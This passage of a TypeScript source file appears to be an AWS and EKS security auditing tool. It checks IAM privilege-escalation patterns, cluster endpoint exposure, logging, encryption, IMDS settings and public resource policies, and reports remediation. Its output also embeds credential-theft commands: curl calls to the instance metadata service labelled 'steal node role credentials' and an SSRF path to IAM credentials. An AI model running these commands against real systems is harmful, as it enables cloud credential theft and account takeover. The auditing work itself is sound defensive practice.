    // Recommendations
    output += `## 🛡️ Recommendations\n\n`;
    output += `1. **Apply least privilege** - Remove unnecessary permissions\n`;
    output += `2. **Use permission boundaries** - Limit maximum permissions\n`;
    output += `3. **Implement SCPs** - Deny dangerous actions at org level\n`;
    output += `4. **Enable GuardDuty** - Detect anomalous API activity\n`;
    output += `5. **Review PassRole permissions** - Most common escalation vector\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

/**
 * Get effective permissions for a principal
 */
async function getPrincipalEffectivePermissions(principalArn: string, principalType: 'User' | 'Role'): Promise<string[]> {
  const permissions: string[] = [];
  const principalName = principalArn.split('/').pop() || '';
  
  try {
    if (principalType === 'User') {
      // User attached policies
      const attachedCmd = new ListAttachedUserPoliciesCommand({ UserName: principalName });
      const attached = await iamClient.send(attachedCmd);
      
      for (const policy of attached.AttachedPolicies || []) {
        const policyPerms = await extractPolicyPermissions(policy.PolicyArn!);
        permissions.push(...policyPerms);
      }
      
      // User inline policies
      const inlineCmd = new ListUserPoliciesCommand({ UserName: principalName });
      const inline = await iamClient.send(inlineCmd);
      
      for (const policyName of inline.PolicyNames || []) {
        const policyCmd = new GetUserPolicyCommand({ UserName: principalName, PolicyName: policyName });
        const policy = await iamClient.send(policyCmd);
        const doc = JSON.parse(decodeURIComponent(policy.PolicyDocument || '{}'));
        permissions.push(...extractActionsFromDocument(doc));
      }
      
      // Group policies
      const groupsCmd = new ListGroupsForUserCommand({ UserName: principalName });
      const groups = await iamClient.send(groupsCmd);
      
      for (const group of groups.Groups || []) {
        const groupPoliciesCmd = new ListAttachedGroupPoliciesCommand({ GroupName: group.GroupName });
        const groupPolicies = await iamClient.send(groupPoliciesCmd);
        
        for (const policy of groupPolicies.AttachedPolicies || []) {
          const policyPerms = await extractPolicyPermissions(policy.PolicyArn!);
          permissions.push(...policyPerms);
        }
      }
    } else {
      // Role attached policies
      const attachedCmd = new ListAttachedRolePoliciesCommand({ RoleName: principalName });
      const attached = await iamClient.send(attachedCmd);
      
      for (const policy of attached.AttachedPolicies || []) {
        const policyPerms = await extractPolicyPermissions(policy.PolicyArn!);
        permissions.push(...policyPerms);
      }
      
      // Role inline policies
      const inlineCmd = new ListRolePoliciesCommand({ RoleName: principalName });
      const inline = await iamClient.send(inlineCmd);
      
      for (const policyName of inline.PolicyNames || []) {
        const policyCmd = new GetRolePolicyCommand({ RoleName: principalName, PolicyName: policyName });
        const policy = await iamClient.send(policyCmd);
        const doc = JSON.parse(decodeURIComponent(policy.PolicyDocument || '{}'));
        permissions.push(...extractActionsFromDocument(doc));
      }
    }
  } catch (e) {
    // Continue with collected permissions
  }
  
  return [...new Set(permissions)];
}

/**
 * Extract permissions from a managed policy
 */
async function extractPolicyPermissions(policyArn: string): Promise<string[]> {
  try {
    const versionCmd = new GetPolicyCommand({ PolicyArn: policyArn });
    const policyInfo = await iamClient.send(versionCmd);
    
    const docCmd = new GetPolicyVersionCommand({
      PolicyArn: policyArn,
      VersionId: policyInfo.Policy?.DefaultVersionId,
    });
    const doc = await iamClient.send(docCmd);
    
    const policyDoc = JSON.parse(decodeURIComponent(doc.PolicyVersion?.Document || '{}'));
    return extractActionsFromDocument(policyDoc);
  } catch (e) {
    return [];
  }
}

/**
 * Extract actions from policy document
 */
function extractActionsFromDocument(doc: any): string[] {
  const actions: string[] = [];
  
  for (const statement of doc.Statement || []) {
    if (statement.Effect === 'Allow') {
      const stmtActions = Array.isArray(statement.Action) ? statement.Action : [statement.Action];
      actions.push(...stmtActions.filter((a: any) => a));
    }
  }
  
  return actions;
}

/**
 * Check if a permission matches a required action (supports wildcards)
 */
function matchesPermission(permission: string, required: string): boolean {
  if (permission === '*' || permission === required) return true;
  
  // Handle service:* patterns
  const [permService, permAction] = permission.split(':');
  const [reqService, reqAction] = required.split(':');
  
  if (permService === reqService && (permAction === '*' || permAction === reqAction)) {
    return true;
  }
  
  // Handle wildcards in permission
  const regex = new RegExp('^' + permission.replace(/\*/g, '.*') + '$');
  return regex.test(required);
}

/**
 * Analyze EKS attack surface comprehensively
 */
async function analyzeEKSAttackSurface(region: string, clusterName?: string): Promise<string> {
  let output = `# 🎯 EKS Attack Surface Analysis\n\n`;
  output += `**Region:** ${region}\n`;
  output += `**Target Cluster:** ${clusterName || 'All clusters'}\n\n`;
  
  try {
    const eksClient = new EKSClient({ region });
    
    // Get clusters to analyze
    let clusters: string[] = [];
    if (clusterName) {
      clusters = [clusterName];
    } else {
      const listCmd = new ListClustersCommand({});
      const list = await eksClient.send(listCmd);
      clusters = list.clusters || [];
    }
    
    if (clusters.length === 0) {
      output += `[INFO] No EKS clusters found in ${region}\n`;
      return output;
    }
    
    output += `## 📊 Clusters Found: ${clusters.length}\n\n`;
    
    for (const cluster of clusters) {
      output += `---\n\n`;
      output += `### 🔷 Cluster: ${cluster}\n\n`;
      
      try {
        const describeCmd = new DescribeClusterCommand({ name: cluster });
        const clusterInfo = await eksClient.send(describeCmd);
        const c = clusterInfo.cluster;
        
        if (!c) continue;
        
        // Basic info
        output += `**Version:** ${c.version}\n`;
        output += `**Status:** ${c.status}\n`;
        output += `**Platform Version:** ${c.platformVersion}\n`;
        output += `**Role ARN:** \`${c.roleArn}\`\n\n`;
        
        // === ENDPOINT SECURITY ===
        output += `#### 🌐 Endpoint Security\n\n`;
        const vpc = c.resourcesVpcConfig;
        
        if (vpc?.endpointPublicAccess) {
          output += `- [CRITICAL] **Public endpoint enabled**\n`;
          if (vpc.publicAccessCidrs?.includes('0.0.0.0/0')) {
            output += `  - ⚠️ Accessible from ANY IP (0.0.0.0/0)\n`;
          } else {
            output += `  - Restricted to: ${vpc.publicAccessCidrs?.join(', ')}\n`;
          }
        } else {
          output += `- [OK] Public endpoint disabled\n`;
        }
        
        if (vpc?.endpointPrivateAccess) {
          output += `- [OK] Private endpoint enabled\n`;
        } else {
          output += `- [WARN] Private endpoint disabled\n`;
        }
        output += `\n`;
        
        // === LOGGING ===
        output += `#### 📝 Audit Logging\n\n`;
        const logging = c.logging?.clusterLogging?.[0];
        if (logging?.enabled) {
          output += `- [OK] Logging enabled: ${logging.types?.join(', ')}\n`;
        } else {
          output += `- [CRITICAL] **Cluster logging disabled** - No audit trail\n`;
        }
        output += `\n`;
        
        // === ENCRYPTION ===
        output += `#### 🔐 Secrets Encryption\n\n`;
        if (c.encryptionConfig && c.encryptionConfig.length > 0) {
          output += `- [OK] Secrets encryption enabled\n`;
          for (const enc of c.encryptionConfig) {
            output += `  - KMS Key: ${enc.provider?.keyArn}\n`;
          }
        } else {
          output += `- [HIGH] **Secrets not encrypted at rest**\n`;
        }
        output += `\n`;
        
        // === IRSA ANALYSIS ===
        output += `#### 🔑 IRSA (IAM Roles for Service Accounts)\n\n`;
        if (c.identity?.oidc?.issuer) {
          output += `- [OK] OIDC provider configured\n`;
          output += `- OIDC Issuer: \`${c.identity.oidc.issuer}\`\n\n`;
          
          output += `**IRSA Attack Vectors:**\n`;
          output += `1. Enumerate ServiceAccounts with IRSA annotations\n`;
          output += `2. Schedule pod with target serviceAccountName\n`;
          output += `3. Access AWS API with service account's IAM role\n\n`;
          
          output += `\`\`\`bash\n`;
          output += `# Find IRSA-enabled service accounts\n`;
          output += `kubectl get serviceaccounts -A -o json | jq '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"]) | {namespace: .metadata.namespace, name: .metadata.name, role: .metadata.annotations["eks.amazonaws.com/role-arn"]}'\n`;
          output += `\`\`\`\n\n`;
        } else {
          output += `- [WARN] OIDC provider not configured (IRSA unavailable)\n`;
          output += `- Pods may use node IAM role (broader access)\n\n`;
        }
        
        // === NODE ROLE ANALYSIS ===
        output += `#### 🖥️ Node Role Security\n\n`;
        output += `**Node Role Credential Theft:**\n`;
        output += `If an attacker gains pod access, they can steal node credentials via IMDS.\n\n`;
        
        output += `\`\`\`bash\n`;
        output += `# From compromised pod - steal node role credentials\n`;
        output += `TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\n`;
        output += `ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n`;
        output += `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\n`;
        output += `\`\`\`\n\n`;
        
        // === NODEGROUPS ===
        output += `#### 📦 Node Groups\n\n`;
        try {
          const ngCmd = new ListNodegroupsCommand({ clusterName: cluster });
          const nodegroups = await eksClient.send(ngCmd);
          
          for (const ng of nodegroups.nodegroups || []) {
            const ngDescCmd = new DescribeNodegroupCommand({ clusterName: cluster, nodegroupName: ng });
            const ngInfo = await eksClient.send(ngDescCmd);
            const nodegroup = ngInfo.nodegroup;
            
            if (nodegroup) {
              output += `- **${ng}**\n`;
              output += `  - Node Role: \`${nodegroup.nodeRole}\`\n`;
              output += `  - Instance Types: ${nodegroup.instanceTypes?.join(', ')}\n`;
              output += `  - AMI Type: ${nodegroup.amiType}\n`;
              
              // Check for launch template (custom user data)
              if (nodegroup.launchTemplate) {
                output += `  - [WARN] Custom launch template - check user data\n`;
              }
            }
          }
        } catch (e) {
          output += `- Unable to enumerate node groups\n`;
        }
        output += `\n`;
        
        // === FARGATE PROFILES ===
        output += `#### 🚀 Fargate Profiles\n\n`;
        try {
          const fpCmd = new ListFargateProfilesCommand({ clusterName: cluster });
          const fargate = await eksClient.send(fpCmd);
          
          if (fargate.fargateProfileNames && fargate.fargateProfileNames.length > 0) {
            for (const fp of fargate.fargateProfileNames) {
              const fpDescCmd = new DescribeFargateProfileCommand({ clusterName: cluster, fargateProfileName: fp });
              const fpInfo = await eksClient.send(fpDescCmd);
              const profile = fpInfo.fargateProfile;
              
              if (profile) {
                output += `- **${fp}**\n`;
                output += `  - Pod Execution Role: \`${profile.podExecutionRoleArn}\`\n`;
                output += `  - Selectors: ${profile.selectors?.map(s => `${s.namespace}/${s.labels ? JSON.stringify(s.labels) : '*'}`).join(', ')}\n`;
              }
            }
            
            output += `\n**Fargate Attack Vector:**\n`;
            output += `1. Create pod matching Fargate selector namespace\n`;
            output += `2. Pod runs with podExecutionRole credentials\n`;
            output += `3. Abuse role permissions for privilege escalation\n\n`;
          } else {
            output += `- No Fargate profiles configured\n\n`;
          }
        } catch (e) {
          output += `- Unable to enumerate Fargate profiles\n\n`;
        }
        
        // === ATTACK SUMMARY ===
        output += `#### ⚔️ Attack Vectors Summary\n\n`;
        output += `| Vector | Risk | Technique |\n`;
        output += `|--------|------|----------|\n`;
        
        if (vpc?.endpointPublicAccess && vpc.publicAccessCidrs?.includes('0.0.0.0/0')) {
          output += `| Public endpoint (0.0.0.0/0) | CRITICAL | Direct API access |\n`;
        }
        output += `| IRSA abuse | HIGH | Pod → AWS API |\n`;
        output += `| Node role theft | HIGH | IMDS credential theft |\n`;
        output += `| Fargate profile abuse | MEDIUM | PassRole escalation |\n`;
        output += `| K8s RBAC escalation | MEDIUM | Cluster admin |\n`;
        output += `\n`;
        
      } catch (e: any) {
        output += `[ERROR] Failed to analyze cluster: ${e.message}\n\n`;
      }
    }
    
    // === REMEDIATION ===
    output += `## 🛡️ Remediation Recommendations\n\n`;
    output += `1. **Disable public endpoint** or restrict to specific CIDRs\n`;
    output += `2. **Enable all audit logs** (api, audit, authenticator, controllerManager, scheduler)\n`;
    output += `3. **Enable secrets encryption** with customer-managed KMS key\n`;
    output += `4. **Use IRSA** instead of node IAM roles\n`;
    output += `5. **Block IMDS access** from pods via network policy\n`;
    output += `6. **Use Pod Security Standards** to restrict privileged pods\n`;
    output += `7. **Rotate node role credentials** regularly\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

/**
 * Detect privilege escalation patterns
 */
async function detectPrivescPatterns(principalArn?: string, includeRemediation: boolean = true): Promise<string> {
  let output = `# 🔺 IAM Privilege Escalation Pattern Detection\n\n`;
  output += `**Target:** ${principalArn || 'All principals'}\n`;
  output += `**Patterns Checked:** ${PRIVESC_PATTERNS.length}\n\n`;
  
  const findings: { pattern: PrivescPattern; principal: string; matchedActions: string[] }[] = [];
  
  try {
    // Get principals to analyze
    const principals: { arn: string; type: 'User' | 'Role'; name: string }[] = [];
    
    if (principalArn) {
      const type = principalArn.includes(':user/') ? 'User' : 'Role';
      principals.push({ arn: principalArn, type, name: principalArn.split('/').pop()! });
    } else {
      // Get all users
      const usersCmd = new ListUsersCommand({});
      const users = await iamClient.send(usersCmd);
      for (const user of users.Users || []) {
        principals.push({ arn: user.Arn!, type: 'User', name: user.UserName! });
      }
      
      // Get all roles (exclude AWS service roles)
      const rolesCmd = new ListRolesCommand({});
      const roles = await iamClient.send(rolesCmd);
      for (const role of roles.Roles || []) {
        if (!role.Arn?.includes('aws-service-role')) {
          principals.push({ arn: role.Arn!, type: 'Role', name: role.RoleName! });
        }
      }
    }
    
    output += `## 📊 Scope\n\n`;
    output += `- **Users:** ${principals.filter(p => p.type === 'User').length}\n`;
    output += `- **Roles:** ${principals.filter(p => p.type === 'Role').length}\n\n`;
    
    // Check each principal against patterns
    for (const principal of principals.slice(0, 30)) { // Limit for performance
      const permissions = await getPrincipalEffectivePermissions(principal.arn, principal.type);
      
      for (const pattern of PRIVESC_PATTERNS) {
        const matchedActions = pattern.requiredActions.filter(action =>
          permissions.some(perm => matchesPermission(perm, action))
        );
        
        if (matchedActions.length === pattern.requiredActions.length) {
          findings.push({ pattern, principal: principal.arn, matchedActions });
        }
      }
    }
    
    // Group by severity
    const critical = findings.filter(f => f.pattern.severity === 'CRITICAL');
    const high = findings.filter(f => f.pattern.severity === 'HIGH');
    const medium = findings.filter(f => f.pattern.severity === 'MEDIUM');
    
    output += `## 🚨 Findings Summary\n\n`;
    output += `| Severity | Count |\n`;
    output += `|----------|-------|\n`;
    output += `| 🔴 CRITICAL | ${critical.length} |\n`;
    output += `| 🟠 HIGH | ${high.length} |\n`;
    output += `| 🟡 MEDIUM | ${medium.length} |\n`;
    output += `\n`;
    
    if (findings.length === 0) {
      output += `## ✅ No Privilege Escalation Patterns Detected\n`;
      return output;
    }
    
    // Detailed findings by category
    const categories = [...new Set(findings.map(f => f.pattern.category))];
    
    for (const category of categories) {
      const categoryFindings = findings.filter(f => f.pattern.category === category);
      
      output += `---\n\n`;
      output += `## ${getCategoryEmoji(category)} ${formatCategory(category)}\n\n`;
      
      for (const finding of categoryFindings.slice(0, 5)) {
        const severityIcon = finding.pattern.severity === 'CRITICAL' ? '🔴' :
                            finding.pattern.severity === 'HIGH' ? '🟠' : '🟡';
        
        output += `### ${severityIcon} ${finding.pattern.name}\n\n`;
        output += `**Principal:** \`${finding.principal}\`\n`;
        output += `**Severity:** ${finding.pattern.severity}\n`;
        output += `**MITRE:** ${finding.pattern.mitreId} - ${finding.pattern.mitreTechnique}\n\n`;
        output += `**Description:** ${finding.pattern.description}\n\n`;
        output += `**Required Actions:** ${finding.pattern.requiredActions.map(a => `\`${a}\``).join(', ')}\n\n`;
        
        output += `**Exploitation:**\n`;
        output += `\`\`\`bash${finding.pattern.exploitation}\`\`\`\n\n`;
        
        if (includeRemediation) {
          output += `**Remediation:** ${finding.pattern.remediation}\n\n`;
        }
      }
    }
    
    // MITRE mapping summary
    output += `## 🗺️ MITRE ATT&CK Mapping\n\n`;
    output += `| Technique ID | Name | Count |\n`;
    output += `|--------------|------|-------|\n`;
    
    const mitreCounts: Record<string, { name: string; count: number }> = {};
    for (const finding of findings) {
      const id = finding.pattern.mitreId;
      if (!mitreCounts[id]) {
        mitreCounts[id] = { name: finding.pattern.mitreTechnique, count: 0 };
      }
      mitreCounts[id].count++;
    }
    
    for (const [id, data] of Object.entries(mitreCounts).sort((a, b) => b[1].count - a[1].count)) {
      output += `| ${id} | ${data.name} | ${data.count} |\n`;
    }
    output += `\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

function getCategoryEmoji(category: string): string {
  const emojis: Record<string, string> = {
    'PASSROLE_EXECUTION': '🎭',
    'POLICY_MANIPULATION': '📝',
    'CREDENTIAL_ACCESS': '🔑',
    'EKS_ABUSE': '☸️',
    'LAMBDA_ABUSE': 'λ',
    'SSM_ABUSE': '💻',
    'S3_ABUSE': '🪣',
    'SECRETS_ACCESS': '🔐',
    'DEFENSE_EVASION': '🙈',
  };
  return emojis[category] || '⚡';
}

function formatCategory(category: string): string {
  return category.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
}

/**
 * Analyze EC2 metadata exposure (SSRF risk)
 */
async function analyzeEC2MetadataExposure(region: string): Promise<string> {
  let output = `# EC2 Metadata Service (IMDS) Exposure Analysis\n\n`;
  output += `**Region:** ${region}\n\n`;

  try {
    const client = new EC2Client({ region });
    const instancesCmd = new DescribeInstancesCommand({});
    const instances = await client.send(instancesCmd);

    let imdsV1Instances: string[] = [];
    let instancesWithRoles: string[] = [];

    for (const reservation of instances.Reservations || []) {
      for (const instance of reservation.Instances || []) {
        const instanceId = instance.InstanceId || 'unknown';
        
        // Check IMDS version
        const httpTokens = instance.MetadataOptions?.HttpTokens;
        if (httpTokens !== 'required') {
          imdsV1Instances.push(instanceId);
        }

        // Check for instance profile (role)
        if (instance.IamInstanceProfile) {
          instancesWithRoles.push(`${instanceId} → ${instance.IamInstanceProfile.Arn}`);
        }
      }
    }

    output += `## IMDSv1 Exposure (SSRF Vulnerable)\n\n`;
    if (imdsV1Instances.length > 0) {
      output += `[WARN] **${imdsV1Instances.length} instances with IMDSv1 enabled (SSRF risk)**\n\n`;
      for (const id of imdsV1Instances.slice(0, 15)) {
        output += `- \`${id}\`\n`;
      }
      if (imdsV1Instances.length > 15) {
        output += `\n...and ${imdsV1Instances.length - 15} more\n`;
      }
      output += `\n**Attack:** SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n`;
    } else {
      output += `[OK] All instances require IMDSv2 (HttpTokens=required)\n\n`;
    }

    output += `## Instances with IAM Roles\n\n`;
    if (instancesWithRoles.length > 0) {
      output += `**${instancesWithRoles.length} instances with attached roles**\n\n`;
      for (const entry of instancesWithRoles.slice(0, 10)) {
        output += `- ${entry}\n`;
      }
      output += `\n`;
    }

    output += `## Remediation\n\n`;
    output += `\`\`\`bash\n`;
    output += `# Enforce IMDSv2 on existing instance\n`;
    output += `aws ec2 modify-instance-metadata-options \\\\\n`;
    output += `  --instance-id i-xxxxx \\\\\n`;
    output += `  --http-tokens required \\\\\n`;
    output += `  --http-endpoint enabled\n`;
    output += `\`\`\`\n`;

  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }

  return output;
}

/**
 * Scan resource-based policies for overly permissive access
 */
async function scanResourcePolicies(region: string, resourceType?: string): Promise<string> {
  let output = `# Resource Policy Security Scan\n\n`;
  output += `**Region:** ${region}\n`;
  output += `**Scope:** ${resourceType || 'all'}\n\n`;

  const scanAll = !resourceType || resourceType === 'all';
  let findings: string[] = [];

  try {
    // S3 bucket policies
    if (scanAll || resourceType === 's3') {
      output += `## S3 Bucket Policies\n\n`;
      const bucketsCmd = new ListBucketsCommand({});
      const buckets = await s3Client.send(bucketsCmd);

      for (const bucket of buckets.Buckets || []) {
        try {
          const policyCmd = new GetBucketPolicyCommand({ Bucket: bucket.Name });
          const policy = await s3Client.send(policyCmd);
          const policyDoc = JSON.parse(policy.Policy || '{}');

          for (const statement of policyDoc.Statement || []) {
            if (statement.Principal === '*' || statement.Principal?.AWS === '*') {
              findings.push(`S3: **${bucket.Name}** has public principal in policy`);
            }
          }
        } catch (e: any) {
          if (!e.name?.includes('NoSuchBucketPolicy')) {
            // Skip buckets without policies
          }
        }
      }
    }

    // SQS queue policies
    if (scanAll || resourceType === 'sqs') {
      output += `## SQS Queue Policies\n\n`;
      const sqsClientRegion = new SQSClient({ region });
      const queuesCmd = new ListQueuesCommand({});
      const queues = await sqsClientRegion.send(queuesCmd);

      for (const queueUrl of queues.QueueUrls || []) {
        const attrsCmd = new GetQueueAttributesCommand({ 
          QueueUrl: queueUrl, 
          AttributeNames: ['Policy'] 
        });
        const attrs = await sqsClientRegion.send(attrsCmd);
        
        if (attrs.Attributes?.Policy) {
          const policy = JSON.parse(attrs.Attributes.Policy);
          for (const statement of policy.Statement || []) {
            if (statement.Principal === '*') {
              const queueName = queueUrl.split('/').pop();
              findings.push(`SQS: **${queueName}** allows public access`);
            }
          }
        }
      }
    }

    // SNS topic policies
    if (scanAll || resourceType === 'sns') {
      output += `## SNS Topic Policies\n\n`;
      const snsClientRegion = new SNSClient({ region });
      const topicsCmd = new ListTopicsCommand({});
      const topics = await snsClientRegion.send(topicsCmd);

      for (const topic of topics.Topics || []) {
        const attrsCmd = new GetTopicAttributesCommand({ TopicArn: topic.TopicArn });
        const attrs = await snsClientRegion.send(attrsCmd);
        
        if (attrs.Attributes?.Policy) {
          const policy = JSON.parse(attrs.Attributes.Policy);
          for (const statement of policy.Statement || []) {
            if (statement.Principal === '*') {
              const topicName = topic.TopicArn?.split(':').pop();
              findings.push(`SNS: **${topicName}** allows public access`);
            }
          }
        }
      }
    }

    // Display findings
    if (findings.length > 0) {
      output += `## [WARN] Security Findings\n\n`;
      for (const finding of findings) {
        output += `- ${finding}\n`;
      }
    } else {
      output += `[OK] No overly permissive policies found\n`;
    }

  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }

  return output;
}

/**
 * Analyze network exposure and egress points
 */
async function analyzeNetworkExposure(region: string): Promise<string> {
  let output = `# Network Exposure Analysis\n\n`;
  output += `**Region:** ${region}\n\n`;

  try {
    const client = new EC2Client({ region });

    // VPCs
    const vpcsCmd = new DescribeVpcsCommand({});
    const vpcs = await client.send(vpcsCmd);

    output += `## VPC Summary\n\n`;
    output += `**Total VPCs:** ${vpcs.Vpcs?.length || 0}\n\n`;

    for (const vpc of vpcs.Vpcs || []) {
      const vpcName = vpc.Tags?.find(t => t.Key === 'Name')?.Value || vpc.VpcId;
      output += `### ${vpcName}\n`;
      output += `- CIDR: ${vpc.CidrBlock}\n`;
      output += `- Default: ${vpc.IsDefault ? 'Yes [WARN]' : 'No'}\n\n`;
    }

    // Security Groups with 0.0.0.0/0
    const sgsCmd = new DescribeSecurityGroupsCommand({});
    const sgs = await client.send(sgsCmd);

    output += `## Internet-Exposed Security Groups\n\n`;
    let exposedSGs: string[] = [];

    for (const sg of sgs.SecurityGroups || []) {
      for (const rule of sg.IpPermissions || []) {
        for (const range of rule.IpRanges || []) {
          if (range.CidrIp === '0.0.0.0/0') {
            exposedSGs.push(`**${sg.GroupName}** (${sg.GroupId}): Port ${rule.FromPort || 'all'} open to internet`);
          }
        }
      }
    }

    if (exposedSGs.length > 0) {
      for (const sg of exposedSGs) {
        output += `- ${sg}\n`;
      }
    } else {
      output += `[OK] No security groups with 0.0.0.0/0 inbound\n`;
    }

    output += `\n## Egress Points\n\n`;
    output += `Check for:\n`;
    output += `- NAT Gateways (controlled egress)\n`;
    output += `- Internet Gateways (direct egress)\n`;
    output += `- VPC Endpoints (AWS service egress)\n`;
    output += `- Transit Gateway attachments\n`;
    output += `- VPC Peering connections\n`;

  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }

  return output;
}

/**
 * Detect potential data exfiltration paths
 */
async function detectDataExfiltrationPaths(region: string): Promise<string> {
  let output = `# Data Exfiltration Path Analysis\n\n`;
  output += `**Region:** ${region}\n\n`;

  try {
    output += `## S3 Replication (Cross-Account Data Flow)\n\n`;
    const bucketsCmd = new ListBucketsCommand({});
    const buckets = await s3Client.send(bucketsCmd);
    output += `**Total buckets to check:** ${buckets.Buckets?.length || 0}\n\n`;
    output += `*Note: Check S3 replication rules for cross-account destinations*\n\n`;

    output += `## Lambda External Connections\n\n`;
    const lambdaClientRegion = new LambdaClient({ region });
    const functionsCmd = new ListFunctionsCommand({});
    const functions = await lambdaClientRegion.send(functionsCmd);

    let externalConnections: string[] = [];
    for (const fn of functions.Functions || []) {
      // Check if Lambda is in VPC (can reach external)
      if (!fn.VpcConfig?.VpcId) {
        externalConnections.push(`**${fn.FunctionName}**: Not in VPC (direct internet access)`);
      }
    }

    if (externalConnections.length > 0) {
      output += `[WARN] **Lambdas with potential external access:**\n\n`;
      for (const conn of externalConnections.slice(0, 10)) {
        output += `- ${conn}\n`;
      }
      output += `\n`;
    }

    output += `## Exfiltration Vectors\n\n`;
    output += `| Vector | Risk | Detection |\n`;
    output += `|--------|------|----------|\n`;
    output += `| S3 to external bucket | HIGH | S3 access logs, CloudTrail |\n`;
    output += `| Lambda to internet | MEDIUM | VPC Flow Logs |\n`;
    output += `| EC2 egress | HIGH | VPC Flow Logs |\n`;
    output += `| DNS tunneling | MEDIUM | Route53 query logs |\n`;
    output += `| RDS snapshots | HIGH | CloudTrail: ShareDBSnapshot |\n`;
    output += `| AMI sharing | HIGH | CloudTrail: ModifyImageAttribute |\n`;

    output += `\n## Monitoring Recommendations\n\n`;
    output += `1. Enable VPC Flow Logs for all VPCs\n`;
    output += `2. Enable S3 access logging\n`;
    output += `3. Monitor CloudTrail for snapshot/image sharing\n`;
    output += `4. Set up GuardDuty for anomaly detection\n`;

  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }

  return output;
}

// ============================================
// EKS/KUBERNETES SECURITY FUNCTIONS
// ============================================

async function scanEKSServiceAccounts(region: string, clusterName: string): Promise<string> {
  const eksClient = new EKSClient({ region });
  
  try {
    const clusterResponse = await eksClient.send(new DescribeClusterCommand({ name: clusterName }));
    const cluster = clusterResponse.cluster;
    
    if (!cluster) {
      return `Error: Cluster ${clusterName} not found in region ${region}`;
    }

    const findings: any[] = [];
    let riskScore = 0;

    // Check OIDC provider for IRSA
    if (!cluster.identity?.oidc?.issuer) {
      findings.push({
        id: 'TC-SA-005',
        severity: 'HIGH',
        name: 'IRSA/Pod Identity Not Configured',
        description: 'No OIDC provider configured - pods cannot use IAM roles for service accounts (IRSA)',
        mitre: 'T1552.005 - Cloud Instance Metadata API',
        test: 'aws eks describe-cluster --name <cluster> --query "cluster.identity.oidc"',
        remediation: 'eksctl utils associate-iam-oidc-provider --cluster <cluster> --approve',
        payload: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      });
      riskScore += 35;
    }

    // Check endpoint access
    if (cluster.resourcesVpcConfig?.endpointPublicAccess) {
      findings.push({
        id: 'TC-EKS-001',
        severity: cluster.resourcesVpcConfig.publicAccessCidrs?.includes('0.0.0.0/0') ? 'CRITICAL' : 'MEDIUM',
        name: 'Public API Server Endpoint',
        description: 'EKS API server has public endpoint enabled',
        mitre: 'T1190 - Exploit Public-Facing Application',
        test: 'aws eks describe-cluster --name <cluster> --query "cluster.resourcesVpcConfig"',
        remediation: 'aws eks update-cluster-config --name <cluster> --resources-vpc-config endpointPublicAccess=false',
        payload: null,
      });
      riskScore += cluster.resourcesVpcConfig.publicAccessCidrs?.includes('0.0.0.0/0') ? 40 : 15;
    }

    // Check logging
    const loggingEnabled = cluster.logging?.clusterLogging?.some(l => l.enabled && l.types?.length);
    if (!loggingEnabled) {
      findings.push({
        id: 'TC-EKS-002',
        severity: 'HIGH',
        name: 'Missing Control Plane Logging',
        description: 'EKS control plane logging is not enabled',
        mitre: 'T1070 - Indicator Removal on Host',
        test: 'aws eks describe-cluster --name <cluster> --query "cluster.logging"',
        remediation: "aws eks update-cluster-config --name <cluster> --logging '{\"clusterLogging\":[{\"types\":[\"api\",\"audit\",\"authenticator\",\"controllerManager\",\"scheduler\"],\"enabled\":true}]}'",
        payload: null,
      });
      riskScore += 25;
    }

    // Check secrets encryption
    if (!cluster.encryptionConfig?.length) {
      findings.push({
        id: 'TC-SECRET-005',
        severity: 'CRITICAL',
        name: 'etcd Secrets Encryption Not Enabled',
        description: 'Kubernetes secrets are not encrypted at rest in etcd',
        mitre: 'T1552.001 - Credentials In Files',
        test: 'aws eks describe-cluster --name <cluster> --query "cluster.encryptionConfig"',
        remediation: "aws eks associate-encryption-config --cluster-name <cluster> --encryption-config '[{\"resources\":[\"secrets\"],\"provider\":{\"keyArn\":\"arn:aws:kms:region:account:key/key-id\"}}]'",
        payload: null,
      });
      riskScore += 40;
    }

    // kubectl commands for further SA analysis
    const saAnalysisCommands = `
## Service Account Security Analysis Commands

### 1. Find pods using default service account
\`\`\`bash
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) | "\\(.metadata.namespace)/\\(.metadata.name)"'
\`\`\`

### 2. Check automountServiceAccountToken on default SA
\`\`\`bash
kubectl get sa default -o yaml | grep -A5 automountServiceAccountToken
\`\`\`

### 3. Find ClusterRoleBindings for service accounts
\`\`\`bash
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | "\\(.metadata.name): \\(.subjects[].namespace)/\\(.subjects[].name) -> \\(.roleRef.name)"'
\`\`\`

### 4. Find SAs with cluster-admin role
\`\`\`bash
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | select(.subjects[]?.kind == "ServiceAccount") | .subjects[] | select(.kind == "ServiceAccount") | "\\(.namespace)/\\(.name)"'
\`\`\`

### 5. Check SA impersonation permissions
\`\`\`bash
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "impersonate") | .metadata.name'
\`\`\`

### 6. Find SAs without IRSA annotation
\`\`\`bash
kubectl get sa -A -o json | jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"] == null) | "\\(.metadata.namespace)/\\(.metadata.name)"'
\`\`\`

### 7. Find legacy SA token secrets
\`\`\`bash
